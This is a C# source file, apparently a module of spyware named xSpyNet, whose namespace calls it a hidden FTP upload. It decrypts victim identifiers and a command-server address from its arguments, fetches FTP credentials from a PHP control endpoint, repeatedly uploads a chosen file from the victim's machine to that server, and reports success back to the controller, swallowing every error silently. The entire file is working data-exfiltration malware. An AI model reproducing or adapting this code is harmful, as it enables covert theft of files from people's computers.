using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Specialized;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Web;

namespace Csl_xSpynet_HiddenFTPUpload
{
    class Program
    {
        public static byte[] encryptData(string data)
        {
            System.Security.Cryptography.MD5CryptoServiceProvider md5Hasher = new System.Security.Cryptography.MD5CryptoServiceProvider();
            byte[] hashedBytes;
            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
            hashedBytes = md5Hasher.ComputeHash(encoder.GetBytes(data));
            return hashedBytes;
        }
        public string md5(string data)
        {
            return BitConverter.ToString(encryptData(data)).Replace("-", "").ToLower();
        }
        static void Main(string[] args)
        {
            try { 
                Random rnd = new Random();
                string Hashx = "tu89geji340t89u2";
                if (args != null && args.Length > 3)
                {
                    string serverid = args[0];
                    string user=xSpyNet.encrypt.Decrypt(args[1], Hashx);
                    string cpuid = xSpyNet.encrypt.Decrypt(args[2], Hashx);
                    string fileurl = xSpyNet.encrypt.Decrypt(args[3], Hashx);
                    string mainserverphp = xSpyNet.encrypt.Decrypt(args[4], Hashx);
                    string queryid= args[5];
                    /**string mainserverphp = "S5YKB+R9RY8PzkE1MXRgyB02jK62gUySdZQ0vW3RXaxI8TSISeR8vAee95mxgbc7";
                    string serverid = "0";
                    string user = "willx";
                    string fileurl = @"E:\Tiny\Games\wsock32.zip";
                    string queryid = "1";
                    string cpuid = "BFEBFBFF000306A9";**/
                    // 0 hKHvuWCpUXzrOfKFGGraeQ== z8V1lUc+q9R+aHUU/g2yjuGpp4QCuGlcRcynexCrN1Q= n90eTfBOy/a8/F+xw9myTM/GEYU/C6LfL4PsRAT2+SA= S5YKB+R9RY8PzkE1MXRgyB02jK62gUySdZQ0vW3RXaxI8TSISeR8vAee95mxgbc7 1
                    /**string serverid = "0";
                    string user = xSpyNet.encrypt.Decrypt("hKHvuWCpUXzrOfKFGGraeQ==", Hashx);
                    string cpuid = xSpyNet.encrypt.Decrypt("z8V1lUc+q9R+aHUU/g2yjuGpp4QCuGlcRcynexCrN1Q=", Hashx);
                    string fileurl = xSpyNet.encrypt.Decrypt("n90eTfBOy/a8/F+xw9myTM/GEYU/C6LfL4PsRAT2+SA=", Hashx);
                    string mainserverphp = xSpyNet.encrypt.Decrypt("S5YKB+R9RY8PzkE1MXRgyB02jK62gUySdZQ0vW3RXaxI8TSISeR8vAee95mxgbc7", Hashx);
                    string queryid = "1";**/
                    //MessageBox.Show(serverid + " " + user + " " + cpuid + " " + fileurl + " " + mainserverphp + " " + queryid);
                    string filenameFTP = xSpyNet.encrypt.md5(user + cpuid + fileurl) + "-" + Path.GetFileName(fileurl);
                    var response = xSpyNet.http.Post(mainserverphp + "sn-aget.php", new NameValueCollection() {
                                { "act", "getftpserverinfo"},
                                { "user", user},
                                { "cpuid", cpuid},
                                { "serverid", serverid},
                                { "token", xSpyNet.encrypt.md5("876d4ce235fe510a3141db3158339c5e"+rnd.Next(10).ToString())}
                    });
                    string result = System.Text.Encoding.UTF8.GetString(response);
                    string[] ftpserverinfo = result.Split('|');
                    Console.WriteLine(ftpserverinfo.Count().ToString());
                    if (ftpserverinfo.Count() == 4)
                    {
                        int ntry = 0;
                        while (xSpyNet.ftp.CheckIfFileExistsOnStoreServer(ftpserverinfo[1], ftpserverinfo[2], ftpserverinfo[3], filenameFTP) == false && ntry <= 50)
                        {
                            xSpyNet.ftp.UploadFileToServerStore(ftpserverinfo[1], ftpserverinfo[2], ftpserverinfo[3], fileurl, filenameFTP);
                            Thread.Sleep(5000);
                            ntry++;
                            //MessageBox.Show(ftpserverinfo[1] + "|" + ftpserverinfo[2] + "|" + ftpserverinfo[3]);
                        }
                        if (xSpyNet.ftp.CheckIfFileExistsOnStoreServer(ftpserverinfo[1], ftpserverinfo[2], ftpserverinfo[3], filenameFTP) == true)
                        {
                            response = xSpyNet.http.Post(mainserverphp + "sn-asend.php", new NameValueCollection() {
                                { "act", "updatequeryinfo"},
                                { "user", user},
                                { "cpuid", cpuid},
                                { "queryid", queryid},
                                { "result", filenameFTP},
                                { "querytype", "getfile"},
                                { "token", xSpyNet.encrypt.md5("876d4ce235fe510a3141db3158339c5e"+rnd.Next(10).ToString())}
                            });
                            result = System.Text.Encoding.UTF8.GetString(response);
                        }

                    }
                }
            }
            catch
            {

            }
        }
    }
}
